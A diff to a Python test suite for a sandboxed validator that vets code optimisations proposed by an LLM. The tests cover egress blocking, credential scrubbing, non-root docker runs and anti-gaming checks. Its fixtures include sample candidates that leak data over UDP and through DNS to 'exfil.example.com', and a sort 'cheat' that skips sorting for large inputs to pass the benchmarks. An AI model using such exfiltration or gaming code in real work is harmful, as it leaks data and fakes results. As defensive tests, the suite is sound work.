@@ -1,6 +1,12 @@
 """Tests for the gauntlet validator."""
 
+import pathlib
+from dataclasses import replace
+
+import pytest
+
 from sis import gauntlet
+from sis.contract import SORT, default_contract
 from sis.paths import OPTIMISED_CANDIDATE_PATH, TARGET_PATH
 
 _GOOD_CODE = OPTIMISED_CANDIDATE_PATH.read_text(encoding="utf-8")
@@ -37,12 +43,36 @@ def test_syntax_error_fails() -> None:
     assert "SyntaxError" in result.reason
 
 
-def test_no_improvement_fails() -> None:
-    # The current naive target can't beat itself by the required margin.
-    naive_source = TARGET_PATH.read_text(encoding="utf-8")
-    result = gauntlet.validate(naive_source, _BASELINE)
+def test_identical_candidate_rejected_as_noop() -> None:
+    # M3 regression: a candidate byte-identical to the baseline is a no-op —
+    # rejected before the benchmark, where at the µs floor the ≥10% margin is
+    # pure timing noise. (The stub re-proposes identical code once its own
+    # optimisation has merged; that must not open a no-op PR.)
+    fast = OPTIMISED_CANDIDATE_PATH.read_text(encoding="utf-8")
+    result = gauntlet.validate(fast, _BASELINE, baseline_source=fast)
+    assert not result.passed
+    assert "no change" in result.reason
+
+
+def test_validate_benchmarks_against_provided_baseline() -> None:
+    # H1 regression: the candidate must be benchmarked against the baseline the
+    # caller supplies (the merged target), not the local runtime/target.py. A
+    # naive O(n) candidate measured against an O(√n) baseline_source is reliably
+    # ~100× slower → rejected as "no improvement". If validate fell back to the
+    # (also naive) local file, naive-vs-naive would be a coin-flip instead.
+    naive = TARGET_PATH.read_text(encoding="utf-8")
+    fast_baseline = OPTIMISED_CANDIDATE_PATH.read_text(encoding="utf-8")
+    result = gauntlet.validate(naive, _BASELINE, baseline_source=fast_baseline)
     assert not result.passed
     assert "no improvement" in result.reason
+
+
+def test_improvement_over_provided_baseline_passes() -> None:
+    # The optimised candidate beats an explicit naive baseline_source and passes.
+    naive = TARGET_PATH.read_text(encoding="utf-8")
+    fast = OPTIMISED_CANDIDATE_PATH.read_text(encoding="utf-8")
+    result = gauntlet.validate(fast, _BASELINE, baseline_source=naive)
+    assert result.passed, f"Expected pass, got: {result.reason}\n{result.errors}"
 
 
 def test_benchmark_gaming_is_rejected() -> None:
@@ -74,9 +104,11 @@ def test_measure_baseline_runs_in_sandbox() -> None:
     assert isinstance(b, float) and b > 0
 
 
-def test_measure_baseline_unmeasurable_returns_zero() -> None:
-    # Source lacking sum_of_divisors → advisory 0.0, not a crash.
+def test_measure_baseline_unmeasurable_returns_zero(capsys) -> None:  # type: ignore[no-untyped-def]
+    # Source lacking sum_of_divisors → advisory 0.0, not a crash — but it must
+    # say so loudly rather than silently feeding a bogus number downstream (L7).
     assert gauntlet.measure_baseline("x = 1\n") == 0.0
+    assert "measure_baseline" in capsys.readouterr().err
 
 
 def test_sandbox_env_scrubs_credentials(monkeypatch) -> None:  # type: ignore[no-untyped-def]
@@ -92,7 +124,14 @@ def test_sandbox_env_scrubs_credentials(monkeypatch) -> None:  # type: ignore[no
     assert env["PATH"]  # still runnable
 
 
-def test_docker_args_are_locked_down() -> None:
+@pytest.fixture
+def ordinary_user(monkeypatch):  # type: ignore[no-untyped-def]
+    """Pin the host uid/gid, so docker-arg tests don't depend on who runs them."""
+    monkeypatch.setattr(gauntlet.os, "getuid", lambda: 1000)
+    monkeypatch.setattr(gauntlet.os, "getgid", lambda: 1000)
+
+
+def test_docker_args_are_locked_down(ordinary_user: None) -> None:
     from sis.gauntlet import _docker_args
 
     args = _docker_args("/tmp/sandbox123", {"PYTHONPATH": "/tmp/sandbox123",
@@ -112,7 +151,7 @@ def test_docker_args_are_locked_down() -> None:
     assert "-e PATH=" not in joined
 
 
-def test_docker_args_forward_no_host_credentials() -> None:
+def test_docker_args_forward_no_host_credentials(ordinary_user: None) -> None:
     from sis.gauntlet import _docker_args
 
     # Only the scrubbed env keys are forwarded — a stray token must not appear.
@@ -121,7 +160,31 @@ def test_docker_args_forward_no_host_credentials() -> None:
     assert "TOKEN" not in joined and "SECRET" not in joined and "KEY" not in joined
 
 
-def test_docker_timeout_kills_the_container(monkeypatch) -> None:  # type: ignore[no-untyped-def]
+def test_docker_sandbox_runs_as_the_host_user(ordinary_user: None) -> None:
+    # Linux regression, found rehearsing OMNI-29: the temp dir is 0700 and owned
+    # by the host user, so a container running as the image's own uid (10001)
+    # got "Permission denied" opening the candidate on native Linux — every
+    # docker gate failed. Docker Desktop's file sharing ignores ownership, which
+    # is why no Mac run ever showed it. The container must run as the owner of
+    # the one directory it is given.
+    args = gauntlet._docker_args("/t", {"HOME": "/t"}, "img", "sis-gauntlet-x")
+    assert args[args.index("--user") + 1] == "1000:1000"
+
+
+def test_docker_sandbox_refuses_to_run_as_root(monkeypatch) -> None:  # type: ignore[no-untyped-def]
+    # As root, the host uid would make candidate code root inside the container.
+    monkeypatch.setattr(gauntlet.os, "getuid", lambda: 0)
+    monkeypatch.setattr(gauntlet.os, "getgid", lambda: 0)
+    with pytest.raises(RuntimeError, match="will not run as root"):
+        gauntlet._docker_args("/t", {"HOME": "/t"}, "img", "sis-gauntlet-x")
+    # ...and the precondition says so up front, not halfway through a cycle.
+    monkeypatch.setenv("SIS_SANDBOX", "docker")
+    monkeypatch.setattr(gauntlet.shutil, "which", lambda _: "/usr/bin/docker")
+    with pytest.raises(RuntimeError, match="will not run as root"):
+        gauntlet.ensure_sandbox_ready()
+
+
+def test_docker_timeout_kills_the_container(monkeypatch, ordinary_user) -> None:  # type: ignore[no-untyped-def]
     # M1 regression: a SIGKILL to `docker run` leaves the container running, so
     # on timeout the gauntlet must `docker kill` it by name — otherwise an
     # infinite-loop candidate burns host CPU forever. Mocked: no real daemon.
@@ -159,8 +222,182 @@ def test_network_egress_is_blocked() -> None:
     assert any("network egress blocked" in line for line in result.errors)
 
 
+_UDP_CODE = '''
+import socket
+
+
+def sum_of_divisors(n: int) -> int:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.sendto(b"leak", ("8.8.8.8", 53))  # UDP needs no connect() — L13 gap
+    return n
+
+
+def benchmark(n: int = 10_000, repetitions: int = 5) -> float:
+    return 1e-9
+'''
+
+_DNS_CODE = '''
+import socket
+
+
+def sum_of_divisors(n: int) -> int:
+    socket.getaddrinfo("exfil.example.com", 80)  # DNS is egress too — L13 gap
+    return n
+
+
+def benchmark(n: int = 10_000, repetitions: int = 5) -> float:
+    return 1e-9
+'''
+
+
+def test_udp_egress_is_blocked() -> None:
+    # L13: UDP sendto (no connect) must be blocked by the soft sandbox too.
+    result = gauntlet.validate(_UDP_CODE, _BASELINE)
+    assert not result.passed
+    assert any("network egress blocked" in line for line in result.errors)
+
+
+def test_dns_resolution_is_blocked() -> None:
+    # L13: getaddrinfo (DNS) is egress and a data-exfil channel — also blocked.
+    result = gauntlet.validate(_DNS_CODE, _BASELINE)
+    assert not result.passed
+    assert any("network egress blocked" in line for line in result.errors)
+
+
 def test_mypy_failure_fails() -> None:
     bad_typed = "def sum_of_divisors(n): return n\ndef benchmark(n=1,repetitions=1): return 0.0\n"
     result = gauntlet.validate(bad_typed, 1.0)
     assert not result.passed
     assert "mypy" in result.reason
+
+
+def test_missing_acceptance_tests_blame_the_harness_not_the_candidate() -> None:
+    # Regression (2026-07-28 minor list): with the suite absent, the gate fell
+    # through to `pytest <a directory that was never created>`, which exits
+    # non-zero and was reported as "pytest failed" — a perfectly good candidate
+    # rejected with a reason pointing at the wrong side of the fence. Must still
+    # fail closed (a correctness gate that did not run is not a pass) but name
+    # the harness as the cause. Now driven by the contract, not a module global.
+    broken = replace(default_contract(), tests_path="specs/does_not_exist/tests.py")
+    result = gauntlet.validate(_GOOD_CODE, _BASELINE, contract=broken)
+    assert not result.passed
+    assert result.reason.startswith("harness:")
+    assert "pytest failed" not in result.reason
+
+
+def test_missing_contract_oracle_blames_the_harness() -> None:
+    # Same principle for the other half of the contract: without the oracle
+    # there is no reference to differ against and no inputs to benchmark over,
+    # so the candidate cannot be judged — that is the harness's fault, not the
+    # candidate's, and must not be recorded as a correctness mismatch.
+    broken = replace(default_contract(), oracle_path="specs/does_not_exist/oracle.py")
+    result = gauntlet.validate(_GOOD_CODE, _BASELINE, contract=broken)
+    assert not result.passed
+    assert result.reason.startswith("harness:")
+    assert "correctness mismatch" not in result.reason
+
+
+def test_candidate_missing_the_contract_entry_fails_the_interface_gate() -> None:
+    # A candidate that is valid, typed, and fast but exports the wrong function
+    # is not a candidate for *this* contract. Before the contract existed this
+    # surfaced as "benchmark script crashed" — an AttributeError deep in the
+    # harness rather than a statement about the diff.
+    wrong_api = (
+        "def totally_different(n: int) -> int:\n"
+        "    return n\n"
+        "def benchmark(n: int = 1, repetitions: int = 1) -> float:\n"
+        "    return 0.0\n"
+    )
+    result = gauntlet.validate(wrong_api, _BASELINE)
+    assert not result.passed
+    assert result.reason.startswith("interface:")
+    assert "sum_of_divisors" in result.reason
+
+
+def test_the_margin_comes_from_the_contract() -> None:
+    # IMPROVEMENT_MARGIN used to be a module constant, so every target had to
+    # want the same 10%. A contract demanding a 99.99% cut must reject the same
+    # candidate the default contract accepts.
+    strict = replace(default_contract(), max_latency_ratio=0.0001)
+    result = gauntlet.validate(_GOOD_CODE, _BASELINE, contract=strict)
+    assert not result.passed
+    assert "no improvement" in result.reason
+
+
+def test_stub_proposer_allows_subprocess_sandbox(monkeypatch) -> None:  # type: ignore[no-untyped-def]
+    # The stub returns a trusted, hand-written candidate → soft sandbox is fine.
+    monkeypatch.setenv("SIS_PROPOSER", "stub")
+    monkeypatch.delenv("SIS_SANDBOX", raising=False)
+    gauntlet.ensure_sandbox_allows_proposer()  # must not raise
+
+
+def test_llm_proposer_requires_docker_sandbox(monkeypatch) -> None:  # type: ignore[no-untyped-def]
+    # M1 regression: untrusted LLM code must not run in the soft subprocess
+    # sandbox, where it can read host files like secrets.local.yml.
+    monkeypatch.setenv("SIS_PROPOSER", "claude")
+    monkeypatch.delenv("SIS_SANDBOX", raising=False)  # subprocess (default)
+    monkeypatch.delenv("SIS_ALLOW_UNSANDBOXED_LLM", raising=False)
+    with pytest.raises(RuntimeError, match="docker sandbox"):
+        gauntlet.ensure_sandbox_allows_proposer()
+
+
+def test_llm_proposer_ok_in_docker_sandbox(monkeypatch) -> None:  # type: ignore[no-untyped-def]
+    monkeypatch.setenv("SIS_PROPOSER", "claude")
+    monkeypatch.setenv("SIS_SANDBOX", "docker")
+    gauntlet.ensure_sandbox_allows_proposer()  # must not raise
+
+
+def test_unsandboxed_llm_override_warns_but_allows(monkeypatch, capsys) -> None:  # type: ignore[no-untyped-def]
+    monkeypatch.setenv("SIS_PROPOSER", "claude")
+    monkeypatch.delenv("SIS_SANDBOX", raising=False)
+    monkeypatch.setenv("SIS_ALLOW_UNSANDBOXED_LLM", "1")
+    gauntlet.ensure_sandbox_allows_proposer()  # allowed under explicit override
+    assert "untrusted" in capsys.readouterr().err.lower()  # ...but loudly
+
+
+def test_validate_refuses_llm_without_docker(monkeypatch) -> None:  # type: ignore[no-untyped-def]
+    # The backstop: validate() itself refuses to run untrusted code unsandboxed,
+    # so no caller can bypass the guard.
+    monkeypatch.setenv("SIS_PROPOSER", "claude")
+    monkeypatch.delenv("SIS_SANDBOX", raising=False)
+    monkeypatch.delenv("SIS_ALLOW_UNSANDBOXED_LLM", raising=False)
+    with pytest.raises(RuntimeError, match="docker sandbox"):
+        gauntlet.validate(_GOOD_CODE, _BASELINE)
+
+
+# --- the second target: the gauntlet is genuinely contract-driven (OMNI-7) ---
+
+_SORT_BASELINE = pathlib.Path(SORT.target_file).read_text(encoding="utf-8")
+_SORT_CANDIDATE = pathlib.Path(str(SORT.stub_candidate_path)).read_text(encoding="utf-8")
+
+
+def test_a_completely_different_target_passes_every_gate() -> None:
+    # The proof L5 was actually fixed: a target with a different name, a
+    # different signature (list -> list, not int -> int), a different oracle and
+    # a different required API passes the same engine code, unmodified.
+    result = gauntlet.validate(
+        _SORT_CANDIDATE, 0.0, baseline_source=_SORT_BASELINE, contract=SORT)
+    assert result.passed, result.reason
+
+
+def test_sort_candidate_with_the_wrong_entry_point_fails_the_interface_gate() -> None:
+    result = gauntlet.validate(
+        "def sorted_list(v: list[int]) -> list[int]:\n    return sorted(v)\n",
+        0.0, baseline_source=_SORT_BASELINE, contract=SORT)
+    assert not result.passed
+    assert result.reason.startswith("interface:")
+    assert "sort_numbers" in result.reason
+
+
+def test_size_conditional_sort_cheat_is_caught_by_differential_correctness() -> None:
+    # Regression for a hole found while building this contract: with a narrow
+    # random-input length range (60-120), this candidate -- silently unsorted
+    # for len > 500 -- passed EVERY gate, because the broken branch was never
+    # reached. The oracle now spans tiny/medium/large lengths. Anti-gaming is
+    # only as good as the input distribution.
+    cheat = ("def sort_numbers(v: list[int]) -> list[int]:\n"
+             "    return v if len(v) > 500 else sorted(v)\n")
+    result = gauntlet.validate(
+        cheat, 0.0, baseline_source=_SORT_BASELINE, contract=SORT)
+    assert not result.passed
+    assert "correctness mismatch" in result.reason
